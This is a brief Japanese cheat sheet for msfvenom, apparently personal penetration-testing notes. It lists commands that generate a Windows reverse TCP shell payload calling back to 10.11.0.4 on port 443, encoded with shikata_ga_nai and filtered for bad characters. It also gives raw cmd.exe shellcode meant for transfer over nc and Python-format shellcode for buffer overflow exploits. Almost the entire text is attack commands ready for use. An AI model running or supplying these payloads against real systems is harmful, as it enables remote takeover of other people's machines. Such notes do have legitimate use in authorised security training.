# msfvenom

### payloadの確認

```bash
msfvenom -l payloads > payloads.txt
cat payloads.txt | grep windows/shell | grep reverse | grep tcp
```

### フォーマットの確認

```bash
msfvenom -h
msfvenom --list formats
```

### リバースシェル（C言語）

```c
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

### rawコードシェル

```bash
msfvenom -a x86 --platform windows -p windows/exec CMD='cmd.exe' -f raw -b "\x00\x0a\x0d\xff" -o raw_shellcode.txt
```

出力ファイルをそのままncで転送するような場合に利用

### BOF用(アプリのクラッシュを防ぐシェル)

```bash
msfvenom -a x86 --platform windows -p windows/exec CMD='cmd.exe'  EXITFUNC=thread -f python -b "\x00\x0a\x12\x1a\x4e\xb1\xd5" 
```

